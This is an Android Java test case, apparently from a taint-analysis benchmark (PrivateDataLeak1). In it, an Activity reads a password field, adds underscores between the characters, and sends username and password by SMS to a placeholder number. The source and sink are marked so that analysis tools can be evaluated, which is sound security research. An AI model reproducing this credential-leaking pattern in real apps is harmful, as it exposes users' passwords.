package de.ecspride;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import de.ecspride.data.User;
/**
 * @testcase_name PrivateDataLeak1
 * @version 0.2
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description A value from a password field is obfuscated and sent via sms.
 * @dataflow source -> pwd -> user.pwd.password -> password -> obfuscatedUsername -> message -> sink
 * @number_of_leaks 1
 * @challenges the analysis has to treat the value of password fields as source,
 *  handle callbacks defined in the layout xml and support taint tracking in
 *  String/char transformations
 */
public class PrivateDateLeakage extends Activity {
	private User user = null;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_private_date_leakage);

		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			if(checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
				requestPermissions(new String[]{Manifest.permission.SEND_SMS}, 1);
			}
		}

    }

	@Override
	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
		switch (requestCode) {
			case 1: {
				onRestart();
				return;
			}
		}
	}
    
    @Override
	protected void onRestart(){
		super.onRestart();
		EditText usernameText = (EditText)findViewById(R.id.username);
		EditText passwordText = (EditText)findViewById(R.id.password);
		
		String uname = usernameText.toString();
		String pwd = "pwd" + passwordText.getText().toString(); //source
		user = new User(uname, pwd);
	}
	
	public void sendMessage(View view){
		if(user != null){
			String password = getPassword();
			String obfuscatedUsername = "";
			for(char c : password.toCharArray())
				obfuscatedUsername += c + "_";

			
			String message = "User: " + user.getUsername() + " | Pwd: " + obfuscatedUsername;
			SmsManager smsmanager = SmsManager.getDefault();
			Log.i("TEST", "sendSMS");
			smsmanager.sendTextMessage("+49 1234", null, message, null, null); //sink, leak
		}
	}
	
	private String getPassword(){
		if(user != null)
			return user.getPwd().getPassword();
		else{
			Log.e("ERROR", "no password set");
			return null;
		}
	}
   
}
